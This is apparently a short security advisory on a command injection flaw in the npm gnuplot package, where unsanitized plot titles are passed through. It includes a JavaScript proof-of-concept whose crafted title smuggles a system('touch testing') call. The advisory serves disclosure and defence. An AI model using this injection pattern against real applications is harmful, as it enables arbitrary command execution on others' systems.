  Command Injection in gnuplot
  All versions of `gnuplot` are vulnerable to Command Injection. The package fails to sanitize plot titles, which may allow attackers to execute arbitrary code in the system if the title value is supplied by a user. The following proof-of-concept creates a `testing` file in the current directory:

  ```
  var gnuplot = require('gnuplot');

  const title = '"\nset title system("touch testing")\n#';

  gnuplot()
  .set('term png')
  .set('output "out.png"')
  .set(`title "${title}"`)
  .set('xrange [-10:10]')
  .set('yrange [-2:2]')
  .set('zeroaxis')
  .plot('(x/4)**2, sin(x), 1/x')
  .end();
  ```


  ## Recommendation

  No fix is currently available. Consider using an alternative package until a fix is made available.
